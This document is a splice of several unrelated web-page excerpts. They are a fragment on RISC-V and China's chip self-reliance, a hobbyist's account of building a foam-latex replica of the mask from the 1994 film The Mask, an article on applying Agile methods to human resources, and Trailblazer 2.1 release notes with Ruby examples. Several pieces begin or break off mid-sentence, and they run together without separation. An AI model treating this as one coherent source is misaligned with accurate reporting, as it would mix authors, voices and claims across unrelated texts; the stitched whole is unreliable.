src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

<p>With the world where it is right now, I thought it would be good to take an objective, reasoned look at some science behind masks.</p>



<p>1994’s <em><a href="https://www.imdb.com/title/tt0110475/">The Mask</a></em> was in many ways a triumph for the practical effects industry at the time. Whole-head protheses were rarely seen outside horror or sci-fi films, let along a prosthetic that could keep up with the exaggerated expressions of Jim Carrey. In 1996, I made a replica of the film’s green-hued headpiece for a friend, winning an award for craftsmanship in a costuming competition. Researching the mask in 1996 – pre-Internet, mind you – was challenging.</p>



<p>Some background: when most people think of special effects masks, they tend to think of liquid latex masks, like the kind you mind find in a Halloween store. Those masks are relatively cheap and easy to make, and they’re fairly sturdy.</p>



<p>The process begins by making a <em>life cast</em> of the actor’s head. If all you need is a pointed ear or a forehead piece (hello, <em>Star Trek</em>), you just cast that bit; Carrey would have needed a whole-head cast. That’s an intense process. You start by smearing a gel-like substance called alginate all over the actor’s head, usually after applying a bald cap to protect their hair. Vaseline is usually smeared over the eyebrows to prevent the alginate from sticking, and a close shave is an absolute must. If you’ve ever had a mold made of your teeth at the dentist’s, then you’ve experience alginate, which is in fact made from algae. It’s a cool substance: you mix a dry powder 1:1 with water, creating a thick gel. When the water hits roughly room temp, the alginate “kicks” and instantly turns into a soft, pliable rubber. For whole-head casts that require some time, you tend to start with very cold water to give yourself max working time. It isn’t comfortable for the subject, who must also be okay breathing through thin tubes you stick in their nostrils. As the “kick” happens, they have to hole <em>absolutely still. </em></p>



<p>Once the “kick” occurs, you start wrapping their alginate head in plaster bandages, like they used to make arm casts out of. Pro tip: smear denture adhesive all over the alginate before starting the bandage-wrap, so that the alginate sticks to the wet bandages and remains attached as the plaster dries. You try to wrap the head in two halves, either left-and-right, or front-and-back, so that you can remove everything in two pieces.</p>



<p>Once the plaster sets – usually about five minutes, during which time you have to keep checking on your subject to make sure they’re okay in there – you use a blunt edge to gently slice the alginate off. You’re inevitably creating a seam, which is why you usually go front-and-back, putting the seam along the top of the head and along the backside of the ears, where it’ll be less likely to mar important features.</p>



<p>With the subject’s head free, they can go take a much-needed shower while you continue to work. Alginate dries quickly and gets crumbly, so you need to immediately start coating the inside of the head with a thick layer of plaster (or more ideally, a liquid stone substance). Embed thin strips of burlap it he mix to help reinforce the structure and hold it together in case of cracks. Plaster will air-cure in several minutes, as the mix generates its own heat; I prefer to work with a stone “slip” that has to go into the oven (on 150 degrees or so, for about twenty minutes) to cure.</p>



<p>When you’re done, you can cut away the bandages and alginate, and you’re left with a “positive” of the subject’s head. Atop that, you use clay to sculpt whatever alien head features you want. Or in my case, The Mask.</p>



<p>Now, this is where we need to get back to latex. Liquid latex is actually fairly stiff when it’s cured. If it’s going to be thick enough to maintain its shape, rather than collapsing like a latex glove, then it winds up being too thick to “move” much in response to the actor’s expressions. So movies tend to go for a foamed latest instead, which is made using a very different technique. There are two basic types: cold foam and hot foam, with the latter being the more professional-looking and, of course, harder to work with as a hobbyist. I used cold foam for mine. It’s a bit less durable and you can miss some fine detail, but The Mask is smooth and my friend only needed to wear it once or twice.</p>



<p>With your sculpting done, you make another cast, this time of the clay-ed-up head, creating a “negative” of the look you’re after. This cast can usually be done directly in plaster, after you spray a mold release agent on the clay. When the cast is set, you pull it off (you usually do this as multiple distinct pieces, so that you can pull them off more easily), and you scrape all the clay off of your original life cast.</p>



<p>So now you’ve got two bits: a “positive” cast of the subject’s actual head, and a “negative” cast (or set of sub-casts) of the mask you’re trying to create. You re-assemble these, and inject your foamed latex into the gaps. The latex fills the space, creating a fairly lightweight, very flexible foam appliance. On the inside, it’s molded to the actor’s head; on the outside, it’s the mask you were attempting to create.</p>



<p>I did The Mask as two pieces: a main piece for the top and back of the head, and a second for the face and jaw. I later learned that the real movie appliance was more like three pieces, and I totally get why – mine worked, but it was a bitch to get on. I did do the nose as a distinct piece, as was done on the movie. Noses are <em>hard. </em></p>



<p>You’ve likely heard of spirit gum, but it’s rarely used with foam latex. The foam is more delicate, and spirit gum is sticky stuff. Instead, I attached the mask with a thin white liquid we called Pros-Aid. It’s a bit gentler, and it removes with a pink liquid we called Detach-o-hol. </p>



<p>From there, it’s a quick blast of green spray paint, some airbrushing for the contours, and a lot of makeup –&nbsp;often rubber mask grease, or RMG, finished with a matte powder to help it set and remove some shine. There’s a huge difference between the makeup job you do for cameras – which include incredible amounts of very bright lights – and the job you do for “in personal” viewing. Movie artists can get away with murder, because the lights tend to hide small imperfections. Like, you should see Spock’s ears on set –&nbsp;totally unconvincing. In-person, you have to be a lot more careful, use finer-grained makeups, and the like.</p>



<p>Sadly, in that pre-cell-phone era, I find myself with no pictures of my accomplishment. The day of, I was so focused on getting it on my friend’s head and <em>keeping</em> it on through his competition, that I never bothered to take a snapshot. We’ve lost touch; I know he’s got some photos, but I’ve not been able to track him down. Besides, it’s probably better in my memory than in reality anyway!</p>



<p>So there you have it: some of the science behind The Mask.</p>

Nowadays, political, social, and technological environments are evolving rapidly. Such changes create further risks and opportunities that may severely influence the way a company operates. For instance, as North American and European countries entered in lock down to combat the spread of the COVID-19 pandemic, several organizations were forced to make the move to remote working, despite not being prepared for it.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; These massive disruptions have led some organizations to go under, while others fundamentally reinvented their operations to meet their strategic goals. In face of recent challenges, several companies have discovered that they need to be resilient, adaptive, and responsive. All such qualities serve as founding pillars to the Agile methodology, which has become increasingly attractive to companies by promoting faster deployment times and resilient workforces that are flexible and adaptive in the face of challenges and changes.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Arguably, a department that is in need of change in many organizations given recent and prior events is human resources (HR). HR is a key pillar in balancing organizational needs with employee’s priorities, helping to build, operate and foster incentive mechanisms and culture. Conversely, decisions made in areas such as prospecting, training, salary, and career development can heavily impact employee motivation and productivity. This incredibly delicate package can directly translate into a company’s ability to meet its strategic goals such as profitability, market share, productivity and sustainability.&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Traditionally, the HR department was governed by stiff protocols that were meant to instil policy alignment, control, and facilitate vertical structures. This style, often criticized as an obstacle to innovative thinking and resilient teams, has been under scrutiny by the business community in recent years. To bring human resources into the digital age, Agile has been identified by some as an ideal solution to create the right incentives necessary to ensure company success, even if partially implemented – Agile Lite (<a href="https://hbr.org/2018/03/the-new-rules-of-talent-management#hr-goes-agile">HR Goes Agile</a>, HBR).</p></div></div></div><div data-id="48430811" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Driven Trends in HR</h2></p></div><div data-id="169f41f3" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unbeknownst to them, some companies have already started to implement Agile practices across their organization, while others have knowingly deployed Agile teams to test the waters. Nevertheless, in many well managed environments, such experiments have proven to be fruitful and have given way to innovative thinking and behaviour.</p></div></div><div data-id="62a25b3e" data-element_type="widget" data-widget_type="heading.default"><p><h3>External Talent Acquisition: Reactive vs. Proactive</h3></p></div><div data-id="5fb1805d" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Traditionally, the modus operandi for bringing new talent was, and still is in most enterprises, reactionary: as positions were made available, a formal search process started, from which a pool of applicants was formed. Once the ideal candidate was identified from the pool of applicants, an incentive package was negotiated and, finally, necessary organizational training was given. This talent acquisition style has its benefits as it ensures that the organization follows controls and policies, however, it can be very time consuming and not necessarily attract or select the best candidate for the position.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Agility driven talent acquisition practices understand the power that a company’s culture has to attract the right personnel. An agile talent acquisition staff becomes less reactive and more proactive in its operational handling. This means that the person is more in tune with the needs of their organization to appropriately forecast personnel needs – this can be done by maintaining a relationship with managers, understanding the turnover ratios on each department, and being attuned to the company’s demographics and needs (ex: what employees are expected to retire soon?).&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; By understanding the organization’s internal environment, talent acquisition members are then able to cultivate relationships across multiple channels (ex: LinkedIn and Universities) and expedite the hiring process should a position become available. It is important to note that this practice does not enforce or condone direct hiring. In fact, it is still advised that talent acquisition staff invite desired candidates to participate in formal hiring processes and, if all boxes are checked, then make an offer to the most qualified individual.</p></div></div></div><div data-id="2166be74" data-element_type="widget" data-widget_type="heading.default"><p><h3>Internal Talent Acquisition: Gigs and Projects</h3></p></div><div data-id="400b0a9" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Inevitably, as organizations’ needs and challenges change, new projects with differing or novel set of skills may appear. Depending on the complexity of the task, consultants or new talent may be brought in. However, for small and short-term projects, the procurement process for new talent or an agency may become too costly, or even risky. In some cases, the skills necessary to fulfill the project may be found in-house. Some forward looking, agility driven organizations have increased their workforce productivity by assigning short-term projects to employees with downtime. For example, should one department require assistance with the automation of a report, they may post the assignment in a board so other members of the company can apply to fulfill the request.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Such practice has been implemented by the <a href="https://www.cppinvestments.com/">CPP Investment Board</a> and they call it <a href="https://cdn3.cppinvestments.com/wp-content/uploads/2020/05/cpp-investments-annual-report-2020-en.pdf">Gigs</a> (optional short-term assignments). Similar internal talent utilization may prove to be beneficial on several levels:</p><ul><li>It can further collaboration and a sense of community within the organization, which further strengthens corporate culture.</li><li>It can serve as a new challenge for employees who may find themselves underwhelmed by their current routine and wish to spice things up.</li><li>It may assist employees to acquire professional experience of skills that they previously viewed as hobbies (ex: graphical design or photography).</li><li>It may serve to further augment and sediment skills acquired through internal or external courses.</li><li>It can support an employee’s transition into a new career.</li></ul></div></div></div><div data-id="2578c15a" data-element_type="widget" data-widget_type="heading.default"><p><h3>Talent Management: Workforce Upskilling</h3></p></div><div data-id="1b44a92c" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Conventional talent management practices are typically owned by HR and focus on assigning static training for individuals who are preparing for new roles, are underperforming, or need to achieve a specific performance level in a desired practice (<a href="https://tech.gsa.gov/guides/applying_agile_practices_HR/#:~:text=According%20to%20the%20HR%20Trend,workforce%20fluctuations%20to%20demand%2C%20and">GSA</a>). This practice alone may not encourage innovative and proactive behaviour among the workforce and can even hurt engagement levels.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Recently, with technological advances in the are of online learning, Agility driven talent management practices are openly facilitated by HR to any employee who wishes to learn or hone a new skill. As such, internal learning portals are available (or the company has the choice to partner with institutions who offer such service) for employees to choose from a vast selection of topics which can be suggested to them according to identified best practices, or can be selected by them independent of their job. Agility driven HR has also found itself with a lot of untapped data that can be harnessed to drive personalized training. Technology is evolving at a rapid pace, causing organizations to consider workforce upskilling as a major driver in the digital age. HR departments that fail to transition at pace, or faster than its competitors may find itself scrambling compete.</p></div></div></div><div data-id="5131c56b" data-element_type="widget" data-widget_type="heading.default"><p><h2>Agile Framework Adapted to HR</h2></p></div><div data-id="2825630a" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initially, Agile was a work methodology destined for software development. However, as time passed, other teams and departments started to retrofit its framework to their operations in the hopes of achieving similar results such as higher productivity, engagement, and efficiency. As explained in our previous article from the Agile series, <a href="https://gpetrium.com/agile-sales-department/">The Agile Sales Department</a>, Agile teams have 4 distinct roles: the team lead (in Scrum, also known as Scrum Master), team member, product owner, and stakeholder. Additionally, Agile practices are surrounded by ceremonies that instill team collaboration, autonomy and ownership to reach mutual objectives. Below, let us discuss how roles and ceremonies can both be adapted to further the HR department’s goals and objectives.</p></div></div><div data-id="460bba18" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The HR Manager</u></strong> is usually tasked with many of the product owner activities. It can range from setting the vision for the team (alongside stakeholders such as Senior HR Manager and Managing Directors), setting priorities, anticipating stakeholder’s needs, overseeing progress, creating key strategic decisions and team targets. At the end of the cycle (or sprint), the HR manager will review the team’s progress and provide relevant guidance for future cycles. Although priorities may differ depending on the company and team, one of the key objectives in this role should be to provide targets and guidance for their HR team depending on their priorities – be it for the compensation team, benefits team, talent management and more.</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <u>The Team Facilitator/ Coordinator</u></strong> serves as an intermediator who encourages the team to be the best they can be (balancing time, cost, and quality), while facilitating meetings, managing stakeholders, reinforcing objective oriented actions, and supporting team introspection.

<h2 id="blog-official-2-1-release-notes">Official 2.1 Release Notes</h2>


<p>(Not that there’s an unofficial one anywhere, but yeah…)</p>



<p>After around 3 years of silence, Trailblazer is back with its 2.1 release. Lots of improvements on the core gems come hand-in-hand with a quite flat migration path, so don’t ya worry! We’re also proud to tell you all about our new upcoming projects in this post, as well as communicating a looot of background about what’s been going on in those past few years.</p>

<p>Here’s a quick summary for those who want to get back to coding.</p>

<ul>
  <li><strong>API CHANGE</strong> The <code>call</code> API has <a href="#blog-official-2-1-release-notes-api-changes">slightly changed</a> from two arguments to just one.</li>
  <li><strong>AUTOLOADING</strong> We removed the <code>trailblazer-loader</code> gem just like Apple removed the headphone jack from the iPhone 6. <a href="#blog-official-2-1-release-notes-loader-startup-speed">This brings you</a> faster startup and consistency with Rails autoloading.</li>
  <li><strong>DOCUMENTATION</strong> We have a <a href="#blog-official-2-1-release-notes-new-website">new website</a>.</li>
  <li><strong>TRACING</strong> We heard your cries. You can now see what path an operation took and use exception tracing for a <a href="#blog-official-2-1-release-notes-developer-experience">beautiful dev experience</a>.</li>
</ul>



<h3 id="blog-official-2-1-release-notes-good-to-see-you-again-">Good to see you, again!</h3>


<p>It almost feels unreal finishing up this release post. It’s been so long! The work put into Trailblazer 2.1 has been tremendous, it could easily have been TRB 3.0, or even TRB III, since Roman version numbering turns out to be quite a fancy thing to do. However, as much as the internals have been improved, as little has changed on the public APIs of Trailblazer, so we decided to go with a minor release.</p>

<p>With the introduction of another new callback <code>after_save_commit</code> in Rails 6 it becomes obvious that we do have a problem in software engineering: how do we structure business code? We do have a few dozen database abstractions in every language, well written and designed, but, yeah, how do I structure the actual code of my domain, of my application’s needs? What’s the best way to put together application functions, put them in order, prevent other functions from being executed when it’s not the time, and so on?</p>

<p>Trailblazer is an architectural style coming as a framework to implement our patterns, trying to answer that one question: “How do I implement business processes?”. It gives you strong conventions along with patterns to structure your code flow better, handle errors, and integrate those components into bigger flows - or <em>processes</em>.</p>

<p>Having said that, I let you decide whether or not you join the ride! There is nothing wrong with building your own “service layer”, and many companies have left the Traiblazer track in the past years due to problems they had and that we think we now fixed.</p>

<p>Speaking of problems, the craziness of the past years working on Trailblazer 2.1 can be visualized with the following screenshot.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-subl.png"></p>

<p>Very often, in order to fix one function <em>A</em> in a commercial app, I had to rewire a track in the <code>endpoint</code> gem, which would only work if I add another DSL option in the <code>dsl</code> gem, which couldn’t work straight away because the normalizer in the <code>context</code> gem needed to be extended, which was only possible if you could finally extract the start event via the <code>activity</code> gem whose test suite was currently broken because I needed to document feature <code>x</code> first, which couldn’t be documented because before I had to allow dynamic params in the <code>macro</code> gem and… I think you got my point.</p>

<p>Luckily, I got help from a band of great people, I took it easy on the conference front, and for some other reasons I still don’t understand all this is now finished and here’s TRB 2.1.</p>



<h3 id="blog-official-2-1-release-notes-about-the-design">About the Design</h3>


<p>A big change from TRB 1.1 and even 2.0 is that we apply functional principles in most places. We barely keep state in instance variables. Rather, data is passed around from operation to operation, from step to step. We use OOP and inheritance solely for compile-time configuration. You define classes, steps, tracks and flows, inherit those, customize them using Ruby’s built-in mechanics, but this all happens at compile-time. At runtime, no structures are changed anymore, your code is executed dynamically but only the <code>ctx</code> (formerly <code>options</code>) and its objects are mutated. This massively improves the code quality and with it, the runtime stability, which Ruby is famous for *cough.</p>

<p>I extracted a lot of smaller libraries from the original <code>trailblazer</code> gem. Most gems use the <code>activity</code> gem itself, which is the core of an operation and provides the runtime object that executes your steps in a certain order. It’s so simple that I sometimes wonder why it took years to develop it! But all those little interfaces, structures and principles that you see as “common sense”, they took a while to figure out.</p>

<p>A lot of work went into the <code>dsl-linear</code> gem that provides a DSL to create activities (or operations) using your old friend <code>#step</code>. It’s not even a DSL since it doesn’t create code at run-time, it doesn’t even create code: it creates runtime objects, <em>activities</em>, that are executed when your operation is run. You could create those objects manually without the DSL, or even write your own DSL, which we’re hoping for!</p>

<p>So, whenever you hear the medieval argument “Trailblazer is just a nasty DSL!”, forgive your opponent, you now know better. The entire framework is based on small, clean Ruby structures that can be executed programmatically.</p>

<p>Also, the more I <em>use</em> Trailblazer in projects or even in Trailblazer itself, I feel how needed those new abstractions are. Yes, you can write everything with your own code, you don’t need abstractions for flow control and automatic error handling, which makes me wonder why you’re not programming in assembler since Ruby is also an “unnecessary abstraction” on top of a processor. We need abstractions, unless you want to program like we did 30 years ago.</p>

<p>Ok, enough of this - let’s jump into the things that actually help you.</p>



<h3 id="blog-official-2-1-release-notes-loader-startup-speed">Loader / Startup Speed</h3>


<p>Startup speed and loading of operations has been a never-ending problem.</p>

<p>To make it short: we returned to the <em>Rails Way™</em>, lowering our heads in shame, and adhere to the Rails file and class naming structure for <em>operations</em>. What used to be named <code>Memo::Create</code> is now <code>Memo::Operation::Create</code>, which reflects its file location <code>concepts/memo/operation/create.rb</code> (still the same!) and works with Rails’ autoloading.</p>

<p>The big benefit is: we could remove the <code>trailblazer-loader</code> gem. The alternative loader was a naive attempt by me to combine “our” naming style with the Rails file structure. After endless fire-fighting against broken development reloading, inconsistencies, slow startup times in develpment mode, more incompatibilities with Rails’ autoloader and some clarifying discussions with the great <a href="https://github.com/fxn">Xavier Noria</a> himself (author of Rails loading and zeitwerk), we ditched our loading mechanism.</p>

<p>If you want to take advantage of the fast server startup times and (almost) seamless hot reloading of classes, you need to <a href="https://trailblazer.to/2.1/docs/trailblazer.html#trailblazer-rails-loader-loader-with-rails">rename your operations</a>.</p>

<p>This change is not super dramatic at all, given that in the future, you won’t be calling operations yourself all too much anymore. With the upcoming <code>workflow</code> and <code>endpoint</code> gems, those abstractions will invoke the business logic for you, so don’t worry too much.</p>



<h3 id="blog-official-2-1-release-notes-new-website">New website</h3>


<p>In case you haven’t noticed: you are reading this release blog post on a newly designed website! Not only does it come with the most beautiful, romantic and inspiring <a href="https://trailblazer.to/2.1/">hero backdrop ever</a> (featuring a James-Cameron-worthy parallax effect, too!), it also attempts to provide all the old documentation while bringing you the hottest off-the-press docs for our new gems.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-lp-hero.png"></p>

<p>We try to keep the “information architecture” - a word I wouldn’t have learned without the inspiring <a href="https://github.com/myabc">Alex Coles</a> - as simple as possible: so far, we got a handful of pages accessible through the top navigation, and then the documentation behind the <a href="https://trailblazer.to/2.1/2.1/docs/trailblazer.html">DOCS</a> link. Here, the right sidebar helps you to navigate within the chapter.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-documentation.png"></p>

<p>After all, we’re a nerdy developer’s library and don’t need no million hipster landing pages! One is more than enough and took months of collaboration between us, the design and web team in Argentina and our awesome comic artist <a href="http://www.joshbauman.com/">Josh Bauman</a> who also drew the epic <a href="https://leanpub.com/trailblazer">Trailblazer book</a> illustrations in 2016.</p>

<p>The documentation has been designed to make coherent information as quickly accessible as possible. We even added a search feature - something our beloved user base has asked for many times. Just hit the <code>/</code> key (or <code>Shift+7</code>) in the docs.</p>



<h3 id="blog-official-2-1-release-notes-api-changes">API CHANGES</h3>


<p>The new 2.1 version comes with a few necessary but reasonable changes in method signatures. As painful as that might sound to your Rails-spoiled ears, we preferred to fix design mistakes now before dragging them on forever.</p>



<ul>
    <li>API CHANGES</li>
    <li id="blog-official-2-1-release-notes-api-changes-new-call-api">New call API</li>
</ul>

<p>In versions before 2.1, the automatic merging of the <code>params</code> part and the additional options was confusing many new users and an unnecessary step.</p>

<pre><code># old style
result = Memo::Create.(params, "current_user" =&gt; current_user)
</code></pre>

<p>The first argument (<code>params</code>) was merged into the second argument using the key <code>"params"</code>. You now pass one hash to <code>call</code> and hence do the merging yourself.</p>

<pre><code># new style
result = Memo::Operation::Create.(params: params, current_user: current_use )
</code></pre>

<p>Your steps use the existing API, and everything here is as it used to be before.</p>

<pre><code>class Memo::Operation::Create &lt; Trailblazer::Operation
  step :create_model

  def create_model(options, params:, **)
    # ..
  end
end
</code></pre>

<p>The new <code>call</code> API is much more consistent and takes away another thing we kept explaining to new users - an indicator for a flawed API. Believe it or not, but not a single time has this topic come up again on our <a href="https://trailblazer.zulipchat.com/">support forum</a>.</p>



<ul>
    <li>API CHANGES</li>
    <li id="blog-official-2-1-release-notes-api-changes-symbol-keys-for-ctx">Symbol keys for ctx</li>
</ul>

<p>The <code>ctx</code> (or <code>options</code>) object now behaves like a <code>HashWithIndifferentAccess</code>, a pattern used for Rails’ <code>params</code> object. In other words, you can now access <code>ctx[:current_user]</code> instead of <code>ctx["current_user"]</code> and conveniently use the keyword argument version of it, too.</p>

<p>Another handy addition to <code>ctx</code> is aliasing. Before 2.1, you had to refer to, say, the main contract via <code>ctx["contract.default"]</code>. While I designed that name “back in the …</p></div></div></div></div></div>

